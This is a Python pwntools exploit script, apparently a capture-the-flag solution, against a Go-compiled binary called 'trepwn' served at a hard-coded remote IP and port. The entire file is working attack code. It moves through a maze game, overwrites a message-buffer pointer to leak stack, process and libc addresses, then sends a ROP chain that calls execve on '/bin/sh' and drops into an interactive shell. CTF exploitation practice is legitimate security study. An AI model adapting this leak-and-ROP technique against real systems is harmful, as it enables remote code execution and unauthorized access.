from pwn import *
from time import sleep
from ctypes import CDLL
import sys,os

context.arch = "amd64"
status 	= sys.argv[1]
elf 	= ELF("./trepwn")
libc 	= ELF("./libc.so")
host 	= "211.159.175.39"
port 	= 8787
name_ptr= 0x489410
ret1	= 0xC820047CE0
padding = '0'*0x30
cc		= False
fuck1 	= False
fuck2 	= False
fuck3 	= False
fuck4 	= False 
fuck5	= False
syscall_Syscall = 0x186600
add_rsp_ret		= 0xd72f4

if status == 'l':
	io = process("./trepwn")
elif status == 'r':
	io = remote(host,port)
else:
	info("INVALID STATUS")
	exit()
#ref_io = process("./trepwn")
#base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[3], 16)
#info("REF.IO proc BASE -> %#x"%base)
#callrand = CDLL('./call.so').call

def mov(d):
	sleep(0.1)
	io.sendlineafter(")>>",d)
def msg(data):
	io.sendlineafter(">> ",data)

name = 'CCCC'
io.sendlineafter("Please input you name :\n",name)
#rand = callrand()

for i in range(5):
	mov('d')
#rand = callrand()
msg('1'*0x10)
info("Treasure 1 found")

for i in range(5):
	mov('w')
#rand = callrand()
msg('2'*0x10)
info("Treasure 2 found")

for i in range(5):
	mov('a')
#rand = callrand()
msg('3'*0x10)
info("Treasure 3 found")

mov('s');mov('d')
des1 = 'dsaw'
des2 = 'sawd'

def mov_brute(d):
	io.sendlineafter(")>>",d)
	if "Cong" in io.recv(0x13):
		info("Treasure 4 found")
		if fuck1 and fuck2 == False and fuck3 == False and fuck4 == False and fuck5 == False:
			pwn2()
		elif fuck1 and fuck2 and fuck3 == False and fuck4 == False and fuck5 == False:
			pwn3()
		elif fuck1 and fuck2 and fuck3 and fuck4 == False and fuck5 == False:
			pwn4()
		elif fuck1 and fuck2 and fuck3 and fuck4 and fuck5 == False:
			pwn5()
		else:
			pwn()
def loop(des):
	sleep(0.1)
	for de in des1:
		for i in range(3):
			mov_brute(de)
def looop():
	cnt = 0
	while True:
		loop(des1)
		cnt=cnt+1
		if(cnt%20==0):
			cod = io.recv(4)
			info("loop %d cod %s"%(cnt,cod))
def looop2():
	cnt = 0
	while True:
		loop(des2)
		cnt=cnt+1
		if(cnt%10==0):
			cod = io.recv(4)
			info("loop %d cod %s"%(cnt,cod))

def pwn():
	global fuck1
	payload = padding
	payload += p64(0x1)*2
	payload += '\x00'*0x80
	payload += '\xf8'
	msg(payload)
	io.recvuntil('message: ')
	global split_stack
	split_stack = u64(io.recv(8))
	success("SPLIT STACK BUF -> %#x"%split_stack)
	io.recvuntil(': (')
	x = int(io.recv(1))
	io.recv(2)
	y = int(io.recv(1))
	for i in range(4-y):
		mov_brute('w')
	for i in range(4-x):
		mov_brute('d')
	fuck1 = True
	looop2()

def pwn2():
	global fuck2
	payload = padding
	payload += p64(0x1)*2
	payload += '\x00'*0x80
	payload += p64(split_stack+0x60)
	msg(payload)
	io.recvuntil('message: ')
	global proc_base
	leak = u64(io.recv(8))-0xd8036
	if (leak&0xfff) == 0:
		proc_base = leak
	elif (leak&0xfff) == 0xfa1:
		proc_base = leak+0x5f
	else:
		proc_base = leak+0xee
	success("PROC BASE -> %#x"%proc_base)
	io.recvuntil(': (')
	x = int(io.recv(1))
	io.recv(2)
	y = int(io.recv(1))
	for i in range(4-y):
		mov_brute('w')
	for i in range(4-x):
		mov_brute('d')
	fuck2 = True
	looop2()
	
def pwn3():
	global fuck3
	payload = padding
	payload += p64(0x1)*2
	payload += '\x00'*0x80
	payload += p64(proc_base+0x474ef0)
	msg(payload)
	io.recvuntil('message: ')
	global libc_base
	libc_base = u64(io.recv(8))-libc.sym['free']
	success("LIBC BASE -> %#x"%libc_base)
	io.recvuntil(': (')
	x = int(io.recv(1))
	io.recv(2)
	y = int(io.recv(1))
	for i in range(4-y):
		mov_brute('w')
	for i in range(4-x):
		mov_brute('d')
	fuck3 = True
	looop2()
	
def pwn4():
	global fuck4
	payload = '\x00'*0x30
	payload += p64(0x1)*2
	payload += '\x00'*0x80
	payload += '\x18'
	msg(payload)
	io.recvuntil('message: ')
	global cache_stack
	cache_stack = u64(io.recv(8))
	success("CACHE STACK BUF -> %#x"%cache_stack)
	io.recvuntil(': (')
	x = int(io.recv(1))
	io.recv(2)
	y = int(io.recv(1))
	for i in range(4-y):
		mov_brute('w')
	for i in range(4-x):
		mov_brute('d')
	fuck4 = True
	looop2()

def pwn5():
	global base,libc_base
	#gdb.attach(io,'b * %d+0xd7980'%base)
	global fuck5
	rop = p64(proc_base+syscall_Syscall)
	rop += p64(add_rsp_ret)
	rop += p64(59)
	rop += p64(libc_base+libc.search("/bin/sh").next())
	rop += p64(0)*3
	payload = '\x00'*0x30
	payload += p64(0x1)*2
	payload += '\x00'*0x80
	payload += p64(split_stack-0xf8+0x38)
	payload += p64(0x30)*2
	payload += p64(0x0)*3
	payload += p64(0x1)+p64(0xcb4)
	payload += p64(cache_stack)
	payload += p64(0x1)+p64(0x0)*2
	payload += rop
	msg(payload)
	io.interactive()
	fuck5 = True

looop()
